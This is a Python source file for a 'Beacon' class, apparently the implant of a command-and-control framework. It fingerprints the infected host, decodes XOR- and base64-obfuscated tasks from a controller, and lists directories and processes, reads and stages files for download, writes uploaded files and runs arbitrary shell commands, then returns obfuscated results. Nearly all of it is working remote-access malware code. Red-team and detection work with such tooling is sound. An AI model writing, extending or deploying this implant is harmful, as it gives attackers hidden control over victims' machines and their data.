import json
import base64
import random
import socket
import os
import platform
import subprocess
# import psutil
from pathlib import Path
from typing import Dict, List


CHARACTER_POOL = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

# Beacon bundle keys
BUNDLE_KEY_BEACON_HASH = "BH"
BUNDLE_KEY_LISTENER_HASH = "LH"
BUNDLE_KEY_USERNAME = "UN"
BUNDLE_KEY_HOSTNAME = "HN"
BUNDLE_KEY_ARCH = "ARC"
BUNDLE_KEY_PRIVILEGE = "PR"
BUNDLE_KEY_OS = "OS"
BUNDLE_KEY_POF = "POF"
BUNDLE_KEY_INTERNAL_IPS = "IIPS"
BUNDLE_KEY_PROCESS_ID = "PID"
BUNDLE_KEY_ADDITIONAL_INFO = "ADI"
BUNDLE_KEY_SESSIONS = "SS"

# Session/message keys
MSG_KEY_INSTRUCTION = "INS"
MSG_KEY_COMMAND = "CM"
MSG_KEY_ARGS = "AR"
MSG_KEY_DATA = "DA"
MSG_KEY_INPUT_FILE = "IF"
MSG_KEY_OUTPUT_FILE = "OF"
MSG_KEY_PID = "PI"
MSG_KEY_ERROR_CODE = "EC"
MSG_KEY_UUID = "UID"
MSG_KEY_RETURN_VALUE = "RV"

DEFAULT_INTERNAL_IP_SEPARATOR = "\n"
DEFAULT_USERNAME = "user"
ROOT_USERNAME = "root"
DEFAULT_PRIVILEGE_ROOT = "high"
DEFAULT_PRIVILEGE_STANDARD = "low"
DEFAULT_DOWNLOAD_SUCCESS = "File downloaded"
DEFAULT_DOWNLOAD_FAILURE = "Download failed"
DEFAULT_UPLOAD_SUCCESS = "File uploaded."
DEFAULT_UPLOAD_FAILURE = "Upload failed."
DEFAULT_EMPTY_RESPONSE = "Empty response."
DEFAULT_UNKNOWN_COMMAND = "cmd unknown."
PS_COMMAND = "ps -aux"
ERROR_NO_SUCH_FILE_PREFIX = "No such file or directory: "


def xor_bytes(data: bytes, key: str) -> bytes:
    """XOR the provided bytes using the supplied key."""
    if not key:
        return data

    key_bytes = key.encode("utf-8")
    return bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data))


def xorEncode(text, key):
    """Backwards compatible helper that XOR encodes text using *key*."""
    if isinstance(text, str):
        data = text.encode("utf-8")
        return xor_bytes(data, key).decode("utf-8", errors="ignore")
    return xor_bytes(text, key)


class Beacon:
        
    def __init__(self):
        self.beaconHash = ""
        self.hostname = ""
        self.username = ""
        self.arch = ""
        self.privilege = ""
        self.os = ""
        self.sleepTimeMs = 1000

        self.tasks: List[Dict[str, object]] = []
        self.taskResults: List[Dict[str, object]] = []

        self.beaconHash = ''.join(random.choice(CHARACTER_POOL) for _ in range(32))

        self.hostname = socket.gethostname()
        self.username = DEFAULT_USERNAME
        try:
            self.username = os.getlogin()
        except:
            self.username = subprocess.run(["whoami"], shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE).stdout.decode('utf-8')
        self.arch = platform.machine()
        if self.username == ROOT_USERNAME:
            self.privilege = DEFAULT_PRIVILEGE_ROOT
        else:
            self.privilege = DEFAULT_PRIVILEGE_STANDARD
        self.os = platform.system()
        self.listenerHash = ""
        self.internalIps = self._collect_internal_ips()
        self.processId = str(os.getpid())
        self.additionalInfo = ""
        self.xorKey = ""


    def set_xor_key(self, key: str) -> None:
        self.xorKey = key or ""

    def _collect_internal_ips(self) -> str:
        ips: List[str] = []
        try:
            host_info = socket.gethostbyname_ex(socket.gethostname())
            for ip in host_info[2]:
                if not ip.startswith("127.") and ip not in ips:
                    ips.append(ip)
        except Exception:
            pass
        return DEFAULT_INTERNAL_IP_SEPARATOR.join(ips)

    def _decode_c2_message(self, message: Dict[str, object]) -> Dict[str, object]:
        instruction = message.get(MSG_KEY_INSTRUCTION, "")
        if not isinstance(instruction, str):
            instruction = str(instruction)

        cmd = message.get(MSG_KEY_COMMAND, "")
        if not isinstance(cmd, str):
            cmd = str(cmd)

        args = message.get(MSG_KEY_ARGS, "")
        if not isinstance(args, str):
            args = str(args)
        pid = message.get(MSG_KEY_PID, -1)
        error_code = message.get(MSG_KEY_ERROR_CODE, -1)
        uuid = message.get(MSG_KEY_UUID, "")
        if not isinstance(uuid, str):
            uuid = str(uuid)

        def _decode_b64(key: str, default: str = "") -> str:
            value = message.get(key, "")
            if not isinstance(value, str) or value == "":
                return default
            try:
                return base64.b64decode(value.encode("utf-8")).decode("utf-8", errors="ignore")
            except Exception:
                return default

        input_file = _decode_b64(MSG_KEY_INPUT_FILE)
        output_file = _decode_b64(MSG_KEY_OUTPUT_FILE)
        return_value = _decode_b64(MSG_KEY_RETURN_VALUE)

        data = message.get(MSG_KEY_DATA, "")
        if isinstance(data, str) and data:
            try:
                data_bytes = base64.b64decode(data.encode("utf-8"))
            except Exception:
                data_bytes = b""
        else:
            data_bytes = b""

        try:
            pid = int(pid)
        except Exception:
            pid = -1

        try:
            error_code = int(error_code)
        except Exception:
            error_code = -1

        return {
            "instruction": instruction,
            "cmd": cmd,
            "args": args,
            "data": data_bytes,
            "inputFile": input_file,
            "outputFile": output_file,
            "pid": pid,
            "errorCode": error_code,
            "uuid": uuid,
            "returnValue": return_value,
        }

    def cmdToTasks(self, input_data: str) -> None:
        if not input_data.strip():
            return

        try:
            decoded = base64.b64decode(input_data.encode("utf-8"))
        except Exception:
            return

        decrypted_bytes = xor_bytes(decoded, self.xorKey)
        try:
            bundles = json.loads(decrypted_bytes.decode("utf-8", errors="ignore"))
        except Exception:
            return

        for bundle in bundles:
            if not isinstance(bundle, dict):
                continue
            beacon_hash = bundle.get(BUNDLE_KEY_BEACON_HASH, "")
            if beacon_hash != self.beaconHash:
                continue

            sessions = bundle.get(BUNDLE_KEY_SESSIONS, [])
            if not isinstance(sessions, list):
                continue

            for session in sessions:
                if not isinstance(session, dict):
                    continue
                task = self._decode_c2_message(session)
                if task.get("instruction"):
                    self.tasks.append(task)

    def _encode_c2_message(self, message: Dict[str, object]) -> Dict[str, object]:
        encoded: Dict[str, object] = {}

        def _encode_b64(value: str) -> str:
            if not value:
                return ""
            return base64.b64encode(value.encode("utf-8")).decode("utf-8")

        instruction = message.get("instruction", "")
        cmd = message.get("cmd", "")
        args = message.get("args", "")
        return_value = message.get("returnValue", "")
        input_file = message.get("inputFile", "")
        output_file = message.get("outputFile", "")
        data = message.get("data", b"")
        pid = message.get("pid", -1)
        error_code = message.get("errorCode", -1)
        uuid = message.get("uuid", "")

        if instruction:
            encoded[MSG_KEY_INSTRUCTION] = instruction
        if cmd:
            encoded[MSG_KEY_COMMAND] = cmd
        if return_value:
            encoded[MSG_KEY_RETURN_VALUE] = _encode_b64(str(return_value))
        if input_file:
            encoded[MSG_KEY_INPUT_FILE] = _encode_b64(str(input_file))
        if output_file:
            encoded[MSG_KEY_OUTPUT_FILE] = _encode_b64(str(output_file))
        if data:
            if isinstance(data, str):
                data_bytes = data.encode("utf-8")
            else:
                data_bytes = data
            encoded[MSG_KEY_DATA] = base64.b64encode(data_bytes).decode("utf-8")
        if args:
            encoded[MSG_KEY_ARGS] = str(args)
        if isinstance(pid, int) and pid != -1:
            encoded[MSG_KEY_PID] = pid
        if isinstance(error_code, int) and error_code != -1:
            encoded[MSG_KEY_ERROR_CODE] = error_code
        if uuid:
            encoded[MSG_KEY_UUID] = str(uuid)

        return encoded

    def serialize_task_results(self) -> str:
        bundle: Dict[str, object] = {}

        if self.beaconHash:
            bundle[BUNDLE_KEY_BEACON_HASH] = self.beaconHash
        if self.listenerHash:
            bundle[BUNDLE_KEY_LISTENER_HASH] = self.listenerHash
        if self.username:
            bundle[BUNDLE_KEY_USERNAME] = self.username
        if self.hostname:
            bundle[BUNDLE_KEY_HOSTNAME] = self.hostname
        if self.arch:
            bundle[BUNDLE_KEY_ARCH] = self.arch
        if self.privilege:
            bundle[BUNDLE_KEY_PRIVILEGE] = self.privilege
        if self.os:
            bundle[BUNDLE_KEY_OS] = self.os
        bundle[BUNDLE_KEY_POF] = "0"
        if self.internalIps:
            bundle[BUNDLE_KEY_INTERNAL_IPS] = self.internalIps
        if self.processId:
            bundle[BUNDLE_KEY_PROCESS_ID] = str(self.processId)
        if self.additionalInfo:
            bundle[BUNDLE_KEY_ADDITIONAL_INFO] = self.additionalInfo

        sessions: List[Dict[str, object]] = []
        for result in self.taskResults:
            sessions.append(self._encode_c2_message(result))
        if sessions:
            bundle[BUNDLE_KEY_SESSIONS] = sessions

        serialized = json.dumps([bundle], separators=(",", ":"))
        encrypted = xor_bytes(serialized.encode("utf-8"), self.xorKey)

        self.taskResults.clear()

        return base64.b64encode(encrypted).decode("utf-8")

    def execInstruction(self):
        for it in self.tasks:
            instruction = it.get("instruction", "")
            args = it.get("args", "")
            cmd = it.get("cmd", "")
            data = it.get("data", b"")
            inputFile = it.get("inputFile", "")
            outputFile = it.get("outputFile", "")
            pid = it.get("pid", -1)
            uuid = it.get("uuid", "")

            if isinstance(data, str):
                data = data.encode("utf-8")

            result = ""
            if instruction == "ls":
                if cmd == "":
                    cmd = "."
                try:
                    dic = os.listdir(cmd)
                    for entry in dic:
                        isFile = "f"
                        if os.path.isfile(cmd+"/"+entry):
                            isFile = "f"
                        elif os.path.isdir(cmd+"/"+entry):
                            isFile = "d"
                        mask = oct(os.stat(cmd+"/"+entry).st_mode)[-3:]
                        path = Path(cmd+"/"+entry)
                        owner = path.owner()
                        group = path.group()
                        result += isFile + mask + " " + owner + " " + group + " " + cmd+"/"+entry
                        result += "\n"
                except:
                    result = ERROR_NO_SUCH_FILE_PREFIX + cmd

            elif instruction == "ps":
                result = subprocess.run([PS_COMMAND], shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE).stdout.decode('utf-8')
                # try:
                #     # print( list(psutil.Process().as_dict().keys()))
                #     for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline']):
                #         cmdLine = ""
                #         for cmd in proc.info["cmdline"]:
                #             cmdLine += cmd + " "
                #         if cmdLine.strip() == "":  
                #             cmdLine = proc.info["name"]

                #         result += proc.info["username"] + " " + str(proc.info["pid"]) + " " + cmdLine
                #         result += "\n"
                # except:
                #     result = "ps failed"

            elif instruction == "cd":
                os.chdir(cmd)
                result = os.getcwd()

            elif instruction == "pwd":
                result = os.getcwd()

            elif instruction == "cat":
                if os.path.isfile(inputFile):
                    f = open(inputFile, "rb")
                    data = f.read()
                    f.close()
                    result = data.decode('utf-8')

            elif instruction == "download":
                if os.path.isfile(inputFile):
                    try:
                        f = open(inputFile, "rb")
                        data = f.read()
                        f.close()
                        result = DEFAULT_DOWNLOAD_SUCCESS
                    except:
                        result = DEFAULT_DOWNLOAD_FAILURE
                else:
                    result = DEFAULT_DOWNLOAD_FAILURE

            elif instruction == "upload":
                try:
                    f = open(outputFile, "wb")
                    f.write(data)
                    f.close()
                    result = DEFAULT_UPLOAD_SUCCESS
                except:
                    result = DEFAULT_UPLOAD_FAILURE

            elif instruction == "run":
                result = subprocess.run([cmd], shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE).stdout.decode('utf-8')
                if not result:
                    result = DEFAULT_EMPTY_RESPONSE

            elif instruction == "sleep":
                self.sleepTimeMs=int(cmd)*1000
                result = cmd

            elif instruction == "end":
                exit(0)

            else:
                result = DEFAULT_UNKNOWN_COMMAND

            taskResult = {
                "args":args,
                "cmd":cmd,
                "data":data,
                "inputFile":inputFile,
                "instruction":instruction,
                "outputFile":outputFile,
                "pid":pid,
                "returnValue":result,
                "errorCode":it.get("errorCode", -1),
                "uuid":uuid,
                }
            self.taskResults.append(taskResult)

        # cleaning
        self.tasks.clear()
